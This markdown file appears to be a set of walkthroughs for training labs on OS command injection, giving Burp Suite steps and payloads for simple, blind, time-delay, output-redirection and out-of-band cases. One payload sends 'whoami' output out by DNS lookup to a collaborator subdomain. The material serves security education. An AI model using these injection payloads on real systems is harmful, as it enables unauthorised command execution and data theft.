# OS Command Injection

## OS command injection, simple case
1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the storeID parameter, giving it the value 1|whoami.
3. Observe that the response contains the name of the current user.

## Blind OS command injection with time delays
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=x||ping+-c+10+127.0.0.1||`
3. Observe that the response takes 10 seconds to return.

## Blind OS command injection with output redirection
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=||whoami>/var/www/images/output.txt||`
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command:
    `filename=output.txt`
5. Observe that the response contains the output from the injected command.

## Blind OS command injection with out-of-band interaction
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

## Blind OS command injection with out-of-band data exfiltration
1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
    `email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`
5. Go back to the Burp Collaborator client window, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.



